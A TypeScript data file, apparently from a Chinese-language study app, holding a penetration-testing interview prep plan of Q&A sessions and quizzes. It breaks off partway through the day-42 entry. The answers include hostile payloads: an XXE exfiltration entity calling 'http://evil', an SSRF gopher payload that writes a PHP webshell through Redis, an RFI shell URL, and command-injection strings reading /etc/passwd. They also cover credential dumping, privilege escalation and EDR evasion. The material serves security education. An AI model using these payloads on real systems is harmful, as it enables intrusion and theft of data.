// 面试突击 — 渗透测试：26天全量复习 + 19天面试实战 = 45天
import { cyberPenetrationPlan } from './cyberPenetration';
import { type CyberDay, type CyberLearningPlan, type QuizQuestion } from './cyberBasic';

function mergeEvenly(days: CyberDay[], target: number): CyberDay[] {
  const n = days.length;
  const result: CyberDay[] = [];
  const groupSize = n / target;
  for (let g = 0; g < target; g++) {
    const start = Math.round(g * groupSize);
    const end = Math.round((g + 1) * groupSize);
    const chunk = days.slice(start, end);
    if (chunk.length === 0) continue;
    const first = chunk[0];
    const last = chunk[chunk.length - 1];
    result.push({
      id: `interview-pen-review-${g + 1}`,
      day: g + 1,
      title: `复习 Day ${g + 1}: ${first.title}`,
      subtitle: chunk.length > 1 ? `速览 Day${first.day}-Day${last.day}（${chunk.length}天合一）` : `原版 Day${first.day}`,
      objectives: [...new Set(chunk.flatMap(d => d.objectives || []))],
      content: chunk.map(d => `## ${d.title}\n\n${d.content || ''}`).join('\n\n---\n\n'),
      keyPoints: [...new Set(chunk.flatMap(d => d.keyPoints || []))] as string[],
      quiz: chunk.flatMap(d => d.quiz || []),
      codeExamples: chunk.flatMap(d => d.codeExamples || []),
      resources: chunk.flatMap(d => d.resources || []),
      labEnvironment: chunk.flatMap(d => d.labEnvironment || []),
      expertNotes: chunk.flatMap(d => d.expertNotes || []),
    } as CyberDay);
  }
  return result;
}

const reviewDays = mergeEvenly(cyberPenetrationPlan.days, 26);

const q = (q: string, opts: string[], ans: number, exp: string): QuizQuestion => ({ question: q, options: opts, correctIndex: ans, explanation: exp });

const interviewDays: CyberDay[] = [
  {
    id: 'interview-pen-i27', day: 27, title: '信息收集与侦查', subtitle: '被动收集·主动扫描·子域·端口·指纹',
    objectives: ['信息收集完整方法论'],
    keyPoints: ['被动信息收集','主动侦察','子域名','端口扫描','指纹识别','CDN绕过'],
    content: `# 信息收集面试 20 问

**Q1: 渗透测试第一步做什么？**
信息收集(占70%时间): whois→子域名→IP段→端口→指纹→目录→爬虫→社工

**Q2: 被动vs主动信息收集？**
被动:不直接与目标交互(搜索引擎/Shodan/Censys/证书透明日志/WHOIS/DNSdumpster)
主动:Nmap扫描/目录爆破/爬虫

**Q3: 子域名收集方法？**
①证书透明度(crt.sh) ②DNS枚举(字典爆破) ③搜索引擎(site:) ④第三方(子域名查询API) ⑤JS提取 ⑥CSP头

**Q4: 绕过CDN找真实IP？**
①历史DNS(securitytrails) ②各地ping(多地解析) ③邮件头 ④子域名 ⑤SSL证书 ⑥网站漏洞(phpinfo)

**Q5: Nmap常用参数？**
-sS半连接 -sT全连接 -sU UDP -sV 版本 -O OS -p- 全端口 -A 综合 -Pn 无ping -T4 速度

**Q6: 端口发现后的服务识别？**
Nmap -sV、nc banner抓取、SSL证书信息、HTTP Server头、404页面特征

**Q7: 目录扫描？**
dirsearch/gobuster/dirb/ffuf | 字典选择(常见/大/针对性) | 关注200/301/403

**Q8: 旁站/C段？**
同服务器不同域名(旁站) | 同C段其他IP | 利用CDN或虚拟主机

**Q9: 搜索引擎Hacking？**
Google Dork: site/intitle/inurl/filetype/intext/ext | Shodan: org/product/port/country

**Q10: 社工信息收集？**
邮箱→注册信息→社交→密码泄露 | 公司组织架构→弱密码规则`,
    quiz: [q('Nmap半连接扫描参数？',['-sT','-sS','-sU','-sA'],1,'-sS=SYN半连接默认root扫描方式'),q('找子域名最可靠方法？',['爆破','证书透明度','google','猜测'],1,'证书透明度crt.sh对HTTPS子域最准确')]
  },
  {
    id: 'interview-pen-i28', day: 28, title: 'Web漏洞利用进阶', subtitle: '注入·RCE·SSRF·XXE·文件包含',
    objectives: ['主流Web漏洞深入理解'],
    keyPoints: ['SQL注入进阶','命令注入','代码注入','文件包含','SSRF进阶','XXE进阶'],
    content: `# Web漏洞深度面试题

**Q1: SQL注入遇到WAF怎么绕？**
双写(uniunionon)、大小写、编码(url/hex)、注释/**/、等价符(=→like,空格→/**/)、内联注释/*!50000select*/、HTTP参数污染

**Q2: 二阶SQL注入？**
用户输入→存入DB(看似安全)→之后从DB读取→拼SQL(危险) 例:注册admin'--用户名→修改密码时触发

**Q3: 命令注入绕过空格？**
\$IFS、\${IFS}、%09(tab)、<、<>、{cat,/etc/passwd}

**Q4: 无回显RCE怎么证明？**
dnslog外带(curl xx.dnslog.cn)、sleep延时、写入文件/写webshell

**Q5: SSRF绕过黑名单？**
①302跳转 ②DNS重绑定 ③进制转换 ④URL parser差异 ⑤利用短网址 ⑥@跳过 ⑦利用CRLF

**Q6: SSRF打内网Redis？**
gopher://IP:6379/_ 发Redis命令 SET shell "<?php eval...\">" \`\`config set dir /var/www/html safe set dbfilename shell.php save

**Q7: 文件包含LFI/RFI？**
LFI(本地):../../etc/passwd | RFI(远程):http://evil/shell.txt | php://input(base64 filter绕过) | 日志包含

**Q8: XXE盲打？**
OOB外带:<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://evil/?x=%file;'>"> %eval

**Q9: 反序列化绕过？**
Java:无readObject用其他魔术方法 | PHP:phar://反序列化、原生类利用 | Python:eval绕过

**Q10: SSTI如何利用？**
Jinja2:{{''.__class__.__mro__[2].__subclasses__()}} → os/system | 绕过:attr()、format、编码`,
    quiz: [q('SSRF绕过需要用到什么协议打Redis？',['http','dict','gopher','file'],2,'gopher协议可以发原始TCP数据，打Redis/Memcached/MySQL'),q('PHP文件包含读源码用什么协议？',['http://','php://filter','phar://','file://'],1,'php://filter/convert.base64-encode/resource=xxx 读源码')]
  },
  {
    id: 'interview-pen-i29', day: 29, title: '渗透测试工具链', subtitle: 'Burp·Nmap·SQLMap·Metasploit·CS',
    objectives: ['核心工具精通'],
    keyPoints: ['Burp Suite','Nmap','SQLMap','Metasploit','CobaltStrike','代理工具'],
    content: `# 渗透工具面试题

**Q1: Burp Suite核心功能？**
Proxy(拦截)、Repeater(重放)、Intruder(爆破)、Scanner(扫描)、Decoder(解码)、Collaborator(外带)

**Q2: Burp插件推荐？**
Autorize(越权)、Turbo Intruder(高速爆破)、Hackvertor(编码)、Taborator(Collaborator增强)

**Q3: SQLMap常用参数？**
--dbs --tables --dump --os-shell --tamper(charencode/space2comment/randomcase) --level --risk

**Q4: SQLMap tamper绕过？**
space2comment(空格→/**/) charencode(url编码) randomcase(大小写) between(=→BETWEEN) equaltolike(=→LIKE)

**Q5: Metasploit核心模块？**
exploit(攻击) payload(shell/bind/rev) auxiliary(扫描) post(后渗透) encoder(编码)

**Q6: MSF提权模块？**
local_exploit_suggester(自动推荐提权) getsystem(Windows) bypassuac

**Q7: CS(CobaltStrike)核心功能？**
Beacon(木马)、Lateral Movement、Pivoting、C2通信、SOCKS代理、Screenshots/keylog

**Q8: CS上线的Beacon类型？**
HTTP/HTTPS/DNS/SMB/TCP/ExternalC2 | DNS Beacon慢但隐蔽

**Q9: 代理工具？**
frp/ngrok/ssh -L本地 -R远程 -D动态 | proxychains | reGeorg

**Q10: 密码破解？**
Hashcat(快GPU) John(多格式) Hydra(在线) | -m指定哈希类型`,
    quiz: [q('CobaltStrike的Beacon是什么？',['木马payload','扫描器','代理工具','漏洞库'],0,'Beacon是CS的核心木马payload执行命令、横向移动等'),q('Burp Collaborator用于？',['爆破','解码','外带数据检测','扫描'],2,'Collaborator检测无回显的外带漏洞SSRF/XXE等')]
  },
  {
    id: 'interview-pen-i30', day: 30, title: '内网渗透与横向移动', subtitle: '域渗透·横向·提权·持久化',
    objectives: ['内网渗透全流程掌握'],
    keyPoints: ['内网拓扑','凭证获取','横向移动','提权','持久化','域控'],
    content: `# 内网渗透面试题

**Q1: 拿到WebShell后怎么做？**
①信息收集(ipconfig→whoami→net user→域信息) ②权限维持 ③提权 ④横向

**Q2: Windows凭证获取？**
hashdump(mimikatz)、lsass dump、SAM/SYSTEM、DPAPI解密、浏览器密码

**Q3: Mimikatz功能？**
sekurlsa::logonpasswords(读明文/哈希)、sekurlsa::pth(哈希传递)、lsadump::dcsync(域控导出)、kerberos::golden(金票)

**Q4: 横向移动方式？**
PsExec(445)、WMI(135)、WinRM(5985)、Scheduled Tasks、SCM、DCOM

**Q5: 横向移动工具对比？**
PsExec(交互式最常用)、WMI(无文件)、SMBexec(通过SMB) | 检测:服务创建event/登录event

**Q6: Linux提权？**
SUID文件(find/vim/bash)、Crontab、内核漏洞、sudo -l、capabilities、Docker组

**Q7: Windows提权？**
内核漏洞、服务权限、UAC绕过、Token窃取、AlwaysInstallElevated、计划任务

**Q8: 域提权到域控？**
DCSync→导出域Hash→金票/GoldenTicket | SMB漏洞(永恒之蓝)

**Q9: 持久化方法？**
Windows:计划任务、服务、注册表启动、WMI事件订阅 | Linux:crontab、SSH key、.bashrc

**Q10: 横向中如何避杀软？**
白名单程序(LOLBAS)、反射加载、内存执行、混淆、签名、进程注入`,
    quiz: [q('DCSync攻击需要什么权限？',['Domain Admin','Domain User','Local Admin','Guest'],0,'DCSync需要复制目录副本的权限通常是Domain Admin或同等权限'),q('Windows横向最常用的工具？',['nmap','sqlmap','PsExec','hydra'],2,'PsExec是Windows横向移动最常用的工具使用445端口')]
  },
  {
    id: 'interview-pen-i31', day: 31, title: '漏洞挖掘方法论', subtitle: '代码审计·Fuzzing·逻辑漏洞',
    objectives: ['漏洞挖掘思路'],
    keyPoints: ['代码审计','Fuzzing','逻辑漏洞','越权','业务流程漏洞'],
    content: `# 漏洞挖掘面试题

**Q1: 代码审计方法？**
①敏感函数追踪(exec/system/eval/readObject/unserialize) ②污点分析(输入端跟踪到漏洞触发点) ③正则+规则扫描

**Q2: 审计一个登录功能看什么？**
SQL注入→密码明文/可逆→验证码绕过→登录错误信息泄露→无频率限制(爆破)→Session固定→记住密码安全

**Q3: 越权漏洞怎么测？**
水平:改资源ID看别人数据 | 垂直:普通用户调管理员接口 | 每个API换token遍历ID测

**Q4: 逻辑漏洞常见？**
支付金额修改/负数、优惠券叠加、数量溢出、验证码重用、密码重置绕过、注册覆盖

**Q5: Fuzzing怎么用？**
AFL(源码编译)、libFuzzer(库)、Peach(协议)、Burp Intruder(Web参数) | 用例生成+异常捕获

**Q6: 漏洞挖掘的日常工作流？**
资产收集→功能分析→风险建模→测试→分析→验证→报告 | 80%时间理解业务

**Q7: 发现0day的秘诀？**
①关注暴露面少的功能 ②测试不常见输入 ③交叉测试不同接口 ④新组件/框架

**Q8: 报告怎么写？**
标题(组件+类型)→CVE→影响→利用条件→复现步骤→修复建议→CVSS评分

**Q9: 黑盒vs白盒渗透？**
黑盒:模拟外部攻击者从0开始 | 白盒:有源码/架构/文档从内部找漏洞

**Q10: 面试中被问"你挖过什么洞"怎么答？**
项目名称+漏洞类型+发现方法+影响+修复效果(套STAR)`,
    quiz: [q('代码审计的第一步？',['全部读一遍','敏感函数追踪','直接跑扫描器','看配置文件'],1,'敏感函数追踪快速定位危险代码是审计第一步'),q('越权漏洞测试最有效的方法？',['扫描器','遍历ID','问开发','看文档'],1,'每个API遍历ID+替换Token是测越权最直观方法')]
  },
  {
    id: 'interview-pen-i32', day: 32, title: '权限提升专题', subtitle: 'Windows·Linux·数据库·容器提权',
    objectives: ['提权全技术栈'],
    keyPoints: ['Windows提权','Linux提权','SUID','内核提权','Token','UAC'],
    content: `# 权限提升面试题

**Q1: Windows提权信息收集？**
systeminfo(补丁)→whoami /priv(特权) → net user/localgroup → tasklist /svc → wmic qfe(补丁号)

**Q2: Windows内核提权？**
MS17-010 EternalBlue → CVE列表对应补丁 → Windows exploit suggester

**Q3: Windows服务提权？**
PowerUp: Get-UnquotedService(引号未闭合) → Service Permissions(可写服务) → Service Binary(替换服务文件)

**Q4: UAC Bypass？**
DLL劫持、fodhelper(reg修改)、eventvwr(注册表) | 管理员权限→直接高完整性

**Q5: AlwaysInstallElevated？**
注册表开启→MSI文件以SYSTEM权限安装→生成带payload的MSI

**Q6: Linux信息收集？**
uname -a → cat /etc/crontab → sudo -l → find / -perm -4000(SUID) → ls -la ~/.ssh

**Q7: SUID提权？**
find(bash跳出) vim(:!bash) less/awk/perl/python(capabilities) | 寻找可写SUID文件

**Q8: Crontab提权？**
可写定时任务脚本→写入反弹shell→等定时执行 | 脚本未设绝对路径→PATH劫持

**Q9: Docker逃逸？**
docker.sock挂载→docker run -v /:/host→chroot /host | --privileged→内核模块加载

**Q10: 数据库提权？**
MySQL UDF提权→sys_exec | MSSQL xp_cmdshell→exec master..xp_cmdshell | Oracle→DBMS_SCHEDULER`,
    quiz: [q('AlwaysInstallElevated提权依赖什么？',['内核漏洞','注册表配置','过期补丁','DLL劫持'],1,'注册表中AlwaysInstallElevated=1时MSI以SYSTEM权限安装'),q('Linux SUID提权用什么找SUID文件？',['ls -la','dpkg -l','find / -perm -4000','netstat -tlnp'],2,'find / -perm -4000列出所有SUID文件')]
  },
  {
    id: 'interview-pen-i33', day: 33, title: '渗透测试报告与沟通', subtitle: '报告写作·客户沟通·复测',
    objectives: ['写出专业渗透报告'],
    keyPoints: ['报告结构','CVSS','修复建议','漏洞分级','客户沟通'],
    content: `# 渗透测试报告面试题

**Q1: 渗透报告标准结构？**
①概述(目标/时间/方法) ②漏洞汇总(等级分布) ③详细漏洞(每个漏洞:描述/复现步骤/截图/影响/修复建议) ④总结与建议

**Q2: CVSS评分要素？**
攻击矢量(AV) 攻击复杂度(AC) 权限要求(PR) 用户交互(UI) 范围(S) 机密/完整/可用影响(CIA)

**Q3: 漏洞等级划分？**
严重(9-10) 高危(7-8.9) 中危(4-6.9) 低危(0.1-3.9) | 高风险+高业务影响=严重

**Q4: 修复建议怎么写？**
具体可执行→不止"修漏洞"→给代码示例/配置命令/版本号→紧急/短期/长期分别给

**Q5: 怎么跟客户沟通发现的高危漏洞？**
先说影响→再说原因→最后说修复→不指责→强调合作改进 | 高危第一时间电话通知

**Q6: 客户不修漏洞怎么办？**
解释风险+赔偿/法律后果→提供缓解措施(DWAF补丁/网络隔离)→记录在报告

**Q7: 复测流程？**
原漏洞是否修复→修了是否引入新漏洞→全部确认后发复测报告

**Q8: 渗透测试的边界？**
测试范围(IP/域名/时间)→越界可能导致法律问题→永远拿授权

**Q9: 渗透频率建议？**
核心系统季/半年一次、重大更新后、新系统上线前 | 配合自动化月扫

**Q10: 自动化扫描vs手工渗透？**
自动化快覆盖面广→大量误报漏报 | 手工深度逻辑漏洞→两者结合`,
    quiz: [q('CVSS分数9.2属于什么等级？',['低危','中危','高危','严重'],3,'CVSS 9.0以上=严重(Critical) 7.0-8.9=高危'),q('渗透报告最关键部分？',['封面','目录','漏洞详情','公司介绍'],2,'漏洞详情包括复现步骤和修复建议是报告核心价值')]
  },
  {
    id: 'interview-pen-i34', day: 34, title: '红队攻击链', subtitle: 'KillChain·ATT&CK·红蓝对抗',
    objectives: ['红队攻击链思维'],
    keyPoints: ['KillChain','MITRE ATT&CK','C2','免杀','红蓝演练'],
    content: `# 红队攻击链面试题

**Q1: Cyber Kill Chain 7步？**
侦察→武器化→投递→利用→安装→C2→目标达成 | Lockheed Martin框架

**Q2: MITRE ATT&CK？**
攻击行为知识库: Tactics(战术)+Techniques(技术)+Procedures(过程) | 把攻击映射到T编号

**Q3: 免杀技术？**
静态免杀:加壳/混淆/换编译器→动态免杀:内存执行/回调/进程注入→行为免杀:白利用/LOLBAS

**Q4: C2通信隐藏？**
域前置(CDN)、DNS隧道、HTTPs仿冒、Malleable C2 Profile(CS定制)、证书仿冒

**Q5: 红蓝对抗怎么做？**
红队模拟APT→攻击链完整演示→蓝队检测响应→紫队复盘改进→提升检测能力

**Q6: 持久化Agent选型？**
CS/Empire/Sliver/Merlin/Villain | 考虑:通信协议/免杀/跨平台/功能

**Q7: 钓鱼攻击？**
鱼叉攻击(特定人)、水坑(专家)、USB投放、钓鱼邮件(附件/链接)

**Q8: 绕过EDR？**
由新进程→DLL侧加载→进程注入(无新进程)→syscall直调(绕过hook)→签名劫持

**Q9: 域控攻击路径？**
获取低权限→信息收集BloodHound→找攻击路径→横向→提权→DCSync→金票

**Q10: 红队演练复盘内容？**
哪些步骤被检测到→检测时间→哪些步骤未检测→建议增加什么检测规则→下次改进点`,
    quiz: [q('KillChain第一步是？',['武器化','侦察','投递','利用'],1,'KillChain第一步是Reconnaissance侦察/信息收集'),q('MITRE ATT&CK中Tactics代表？',['具体技术','攻击目标/阶段','工具名称','漏洞编号'],1,'Tactics=攻击阶段如Initial Access→Execution→Persistence')]
  },
  {
    id: 'interview-pen-i35', day: 35, title: 'WAF绕过与免杀', subtitle: 'WAF绕过技巧·免杀方法论',
    objectives: ['WAF绕过和免杀实战'],
    keyPoints: ['WAF识别','WAF绕过','免杀','内存马','无文件攻击'],
    content: `# WAF绕过与免杀面试题

**Q1: 如何识别目标是否用了WAF？**
①wafw00f工具 ②请求含恶意payload看响应(403/拦截页) ③特殊header返回 ④cookie附加内容

**Q2: WAF绕过思路？**
HTTP层面:分块传输+参数污染+HTTP/1.0→协议层:混合大小写+空白+编码→业务层:等价替换+语法变体

**Q3: SQL注入WAF绕过？**
参数:内联注释/*!*/+浮点数(1.0union) | 函数:json_extract代替substr | 空白:科学记数法

**Q4: XSS WAF绕过？**
标签:<svG>大小写 | 事件:ontoggle(非onerror) | 无括号:location='javascript:alert(1)' | location/hash

**Q5: 文件上传WAF绕过？**
Content-Type:MIME绕过+双扩展+.php::$DATA+.htaccess自定义解析+.phtml/.pht

**Q6: 常见免杀技术？**
Shellcode加密(XOR/AES)+加载器混淆+无文件内存加载+PIC位置无关代码+片段加载

**Q7: 内存马是什么？**
不落地webshell直接注入内存→Java Filter/Python/ASPX | 无文件+服务重启消失

**Q8: 免杀效果测试？**
virustotal本地检查→defender扫描→主流EDR环境测试→反沙箱(延迟/环境检测)

**Q9: 无文件攻击？**
注册表存储payload→WMI脚本执行→PowerShell内存执行→.NET反射加载→全程不写磁盘

**Q10: 检测免杀木马的方法？**
内存扫描、行为检测(进程链/网络连接)、ETW日志、AMSI捕获`,
    quiz: [q('内存马优点？',['持久化','无文件','跨平台','可调试'],1,'内存马无文件落地不写磁盘绕过文件检测'),q('分块传输绕过WAF的原理？',['DNS','TCP分片','HTTP Transfer-Encoding chunked','UDP'],2,'Transfer-Encoding:chunked分块绕过WAF对完整请求的检查')]
  },
  {
    id: 'interview-pen-i36', day: 36, title: '移动端与IoT安全', subtitle: 'APP逆向·小程序·IoT漏洞',
    objectives: ['移动安全和IoT基础'],
    keyPoints: ['APP反编译','小程序','API安全','IoT固件','硬件安全'],
    content: `# 移动安全与IoT面试题

**Q1: Android APP审计流程？**
APK解压→dex2jar→jadx-gui读Java→提取URL/密钥→抓包分析API→反编译动态分析

**Q2: Android APP常见漏洞？**
组件导出(Activity/Service/Receiver)、WebView漏洞(JS→Java)、不安全数据存储(SharedPreference明文)、签名校验绕过

**Q3: iOS APP审计？**
越狱→安装Frida→Hook关键函数→抓包(SSL Pinning绕过)→Keychain数据提取

**Q4: 小程序安全？**
前端逻辑(隐藏按钮)、敏感信息(未脱敏)、API鉴权(越权)、支付逻辑(金额修改)、抓包改包

**Q5: APP的SSL Pinning怎么绕过？**
Android:JustTrustMe(Frida/Xposed) | iOS:SSL Kill Switch 2 | 低版本降级

**Q6: IoT固件提取？**
官网下载→拆机串口→UART/JTAG→Flash芯片编程器→OTA抓包

**Q7: IoT常见漏洞？**
硬编码密码、未认证API、弱加密、串口未保护、U-Boot未锁

**Q8: 固件分析工具？**
binwalk提取、firmwalker扫描、FACT平台、firmadyne模拟器

**Q9: 智能设备安全测试？**
网络通信(TLS/MQTT)→固件→WEB管理页面→手机APP→云端API 五层全测

**Q10: 物联网协议安全问题？**
MQTT无加密认证、ZigBee密钥管理、蓝牙嗅探、CoAP/UDP反射放大`,
    quiz: [q('Android反编译首选工具？',['IDA','Ghidra','jadx-gui','Hopper'],2,'jadx-gui直接读Java源代码是Android审计最常用工具'),q('IoT固件分析用什么提取？',['nmap','binwalk','burp','sqlmap'],1,'binwalk提取固件文件系统是IoT分析第一步')]
  },
  {
    id: 'interview-pen-i37', day: 37, title: '场景模拟 Day 1', subtitle: '渗透测试面试连环追问',
    objectives: ['应对渗透测试面试'],
    keyPoints: ['渗透流程表达','具体案例STAR','遇到问题怎么解决'],
    content: `# 渗透测试面试场景

**场景1:"讲一个你完整的渗透测试项目"**
【STAR示例】
S:在对某金融平台红蓝演练中，作为红队主力负责Web到域控全链路
T:需要在规定时间内从外网打穿到域控获取敏感数据证明影响
A:信息收集发现xx子域名→SQL注入获取数据→Hash→横向移动→利用域漏洞→DCSync→获取域控
R:48h完成全链路，发现3个严重漏洞，推动修补

**场景2:"渗透中遇到阻碍怎么办？"**
→ CDN怎么办(找真实IP)
→ WAF怎么办(尝试多种绕过)
→ 内网不通怎么办(找双网卡机器做跳板)
→ 无回显怎么办(DNS外带+延时)
→ 不熟的系统怎么办(搜EXP+看文档)

**场景3:"你如何保证渗透测试的规范？"**
授权→测试范围→敏感时间窗口避开→不对生产数据做破坏性操作→所有操作记录日志→及时通报高危漏洞

**场景4:"渗透vs红队区别？"**
渗透:广撒网找漏洞→漏洞导向→全面测试
红队:模拟真实APT→目标导向→隐蔽优先→攻防对抗

**场景5:被问"有没有被WAF卡住的经历"**
"Yes，当时用XXX方法绕过失败，后来发现YYY方法有效。总结下来XXX情况下YYY更有效"`,
    quiz: []
  },
  {
    id: 'interview-pen-i38', day: 38, title: '渗透测试工具链速查', subtitle: '工具分类·场景选择·参数速查',
    objectives: ['工具场景匹配'],
    keyPoints: ['工具速查表','场景匹配','效率提升'],
    content: `# 渗透测试工具速查表

| 阶段 | 工具 | 场景 |
|------|------|------|
| 子域名 | Subfinder/Amass/crt.sh | 子域发现 |
| IP/端口 | Nmap/Masscan/Zmap | 端口扫描 |
| 指纹 | Wappalyzer/Nuclei/TideFinger | 技术栈识别 |
| 目录 | dirsearch/ffuf/gobuster | 目录文件发现 |
| Web漏洞 | Burp/Xray/Sqlmap | Web渗透 |
| 内网穿透 | frp/ngrok/chisel | 代理穿透 |
| 横向移动 | impacket(psexec/wmiexec)/crackmapexec | Windows内网 |
| 提权 | PEASS-ng/WinPEAS/LinPEAS | 系统审计 |
| 凭证 | mimikatz/LaZagne | 密码提取 |
| C2 | CS/Sliver/Mythic | 后渗透控制 |
| 密码破解 | hashcat/john/hydra | 密码破解 |
| 内网信息 | BloodHound/adPEAS | AD审计 |
| 代理链 | proxychains/proxifier | 代理转发 |
| 漏洞扫描 | nuclei/xray/AWVS | 自动化扫描 |
| 漏洞利用 | MSF/searchsploit/pocsuite | EXP框架 |

**CTF常见题型**：Web(注入/反序列化/SSTI/XXE)、PWN(栈溢出/堆)、Crypto、Reverse、Misc

**效率提升**：
- 信息收集并行化(多个工具一起跑)
- 扫描前先看Sitemap/API文档减少盲目
- 关注响应包大小和响应时间(盲注/SSRF盲打线索)
- 用Burp Collaboration/Interactsh收外带数据`,
    quiz: []
  },
  {
    id: 'interview-pen-i39', day: 39, title: 'APT与威胁情报', subtitle: 'APT组织·IOC·威胁情报平台',
    objectives: ['APT和威胁情报基本概念'],
    keyPoints: ['APT组织','IOC','TTPs','威胁情报','MITRE ATT&CK'],
    content: `# APT与威胁情报面试题

**Q1: 什么是APT？**
Advanced Persistent Threat | 国家级/组织级定向攻击 | 长期潜伏/多阶段/高技术

**Q2: IOC vs IOA？**
IOC(Indicator of Compromise入侵指标)事后:恶意IP/域名/哈希
IOA(Indicator of Attack攻击指标)事前/事中:异常行为/异常进程关系

**Q3: 威胁情报金字塔？**
底层(哈希/IP/域名)→中层(工具/基础设施)→上层(TTP战术技术过程) | TTP最稳定最有价值

**Q4: 威胁情报来源？**
开源:AlienVault OTX/MISP/Feed(商用:FireEye/CrowdStrike) | 内部:Honeypot/日志分析

**Q5: 什么叫TTP？**
Tactics(战术目标如初始接入) Techniques(技术如鱼叉攻击) Procedures(过程具体实现) | MITRE ATT&CK

**Q6: APT常见初始接入方式？**
鱼叉邮件、水坑攻击、VPN漏洞、供应链攻击、钓鱼U盘

**Q7: 如何建立威胁检测规则？**
IOC匹配→行为检测→异常基线→ATT&CK映射→Sigma规则→SIEM落地

**Q8: 威胁狩猎vs传统检测？**
传统检测:已知规则匹配 | 威胁狩猎:假设已入侵主动找未知威胁

**Q9: 沙箱分析？**
Cuckoo/Any.Run/Joe Sandbox | 动态行为分析+网络流量+进程调用

**Q10: ATT&CK框架有什么用？**
统一攻击描述语言、映射检测覆盖率、指导防御建设、红蓝统一语言`,
    quiz: [q('IOC代表？',['入侵指标','攻击指标','安全指标','网络指标'],0,'IOC=Indicator of Compromise 入侵指标如恶意IP/域名'),q('威胁情报金字塔最顶层？',['哈希','IP','工具','TTP'],3,'TTP最稳定最有长期价值')]
  },
  {
    id: 'interview-pen-i40', day: 40, title: '全真模拟面试 — 渗透篇', subtitle: '20道随机面试题 · 独立作答',
    objectives: ['模拟渗透面试·查漏补缺'],
    keyPoints: ['渗透全流程','工具链','漏洞实战'],
    content: `# 全真模拟面试 — 渗透测试模块

**1.** 渗透测试的标准流程是什么？每阶段用哪些工具？

**2.** 如何绕过CDN找到目标真实IP？至少4种方法

**3.** SQL注入有哪几种？如何在没有回显的情况下利用？

**4.** SSRF如何打内网？有什么绕过黑名单的方法？

**5.** 文件上传绕过方式？黑名单+白名单怎么分别绕过？

**6.** 拿到WebShell后完整的后渗透流程？

**7.** Windows内网横向移动有哪些方式？工具是什么？

**8.** 黄金票据和白银票据区别？分别需要什么？

**9.** Windows和Linux各说3种提权方法

**10.** CS的Beacon通信怎么隐藏？域前置怎么实现？

**11.** XXE的利用方式和防御方法？

**12.** 免杀的基本思路？静态和动态有什么区别？

**13.** 越权漏洞怎么测？水平和垂直越权的区别？

**14.** 移动端APP渗透测试流程？

**15.** IoT安全测试从哪些方向入手？

**16.** WAF绕过思路(至少5种)？

**17.** 渗透报告怎么写？CVSS如何评分？

**18.** Red Team vs Penetration Testing区别？

**19.** ATT&CK框架实战中有什么用？

**20.** 你做过最满意的一次渗透测试，STAR方式描述**

---

**自评**：
≥16题通透: 渗透岗位稳了
12-15题: 有准备但需要加深内网/工具链
<12题: 回顾前26天知识+面试实战部分`,
    quiz: []
  },
  {
    id: 'interview-pen-i41', day: 41, title: '全真模拟面试（一）', subtitle: '自我介绍·技术问答·场景设计',
    objectives: ['完成一次30分钟全真模拟面试'],
    keyPoints: ['自我介绍','技术问答链式追问','场景设计','抗压测试'],
    content: '# 渗透测试方向 — 全真模拟面试（一）：自我介绍·技术问答·场景设计\n\n## 🎯 今日目标\n\n完成一次30分钟全真模拟面试，重点练习自我介绍和技术问答的开场部分。\n\n---\n\n## 📋 模拟面试流程\n\n### 第一环节：自我介绍（3分钟）\n\n**模板**：\n\n> 面试官好，我是XXX，有X年渗透测试方向经验。\n> 我擅长[核心技能1]、[核心技能2]和[核心技能3]。\n> 最近参与过[代表性项目]，在这个项目中我负责[你的角色]，取得了[量化成果]。\n> 我一直关注渗透测试领域的最新动态，对[热点技术]有深入研究。\n> 希望能加入贵团队，在渗透测试方向持续深耕。\n\n**关键技巧**：控制在3分钟内 | 用数字量化成果 | 与岗位JD对应 | 结尾留悬念引导追问\n\n### 第二环节：技术问答链式追问（15分钟）\n\n面试官会从你的自我介绍中挑一个技术点深挖，准备应对3-5层追问：\n\n**链式追问示例**（以"Web安全"为例）：\n1. Q: "你说熟悉Web安全，讲一个你挖过的有意思的漏洞？"\n2. Q: "为什么当时选择用这个工具而不是另一个？"\n3. Q: "如果WAF拦截了你的payload，你会怎么绕过？"\n4. Q: "你挖的这个漏洞的根本原因是什么？架构上怎么避免？"\n5. Q: "如果你来设计这个系统的安全方案，你会怎么做？"\n\n**应对策略**：不知道的诚实说不会但展示学习思路 | 每个回答控制在1-2分钟 | 适时反问确认问题\n\n### 第三环节：场景设计题（12分钟）\n\n**典型场景题**："如果公司新上线一个渗透测试相关的系统，从安全角度你会怎么评估？"\n\n**回答框架**：\n1. 资产梳理 → "首先我会梳理系统的资产：有哪些组件、暴露哪些端口、处理什么数据"\n2. 威胁建模 → "然后用STRIDE/攻击树方法梳理可能的威胁"\n3. 风险评估 → "对威胁进行风险评级，确定优先级"\n4. 测试验证 → "通过渗透测试/代码审计验证漏洞"\n5. 修复建议 → "给出分层的修复方案和整改时间线"\n\n---\n\n## 📝 面试评分卡（自评）\n\n| 维度 | 1分(差) | 2分(一般) | 3分(好) | 4分(优秀) |\n|------|---------|-----------|---------|----------|\n| 表达清晰度 | □ | □ | □ | □ |\n| 技术深度 | □ | □ | □ | □ |\n| 逻辑思维 | □ | □ | □ | □ |\n| 场景分析 | □ | □ | □ | □ |\n| 抗压表现 | □ | □ | □ | □ |\n',
    quiz: []
  },
  {
    id: 'interview-pen-i42', day: 42, title: '全真模拟面试（二）', subtitle: '漏洞利用·内网渗透·提权免杀',
    objectives: ['深度技术面试模拟'],
    keyPoints: ['漏洞利用链','内网渗透','提权','免杀技术','红队工具'],
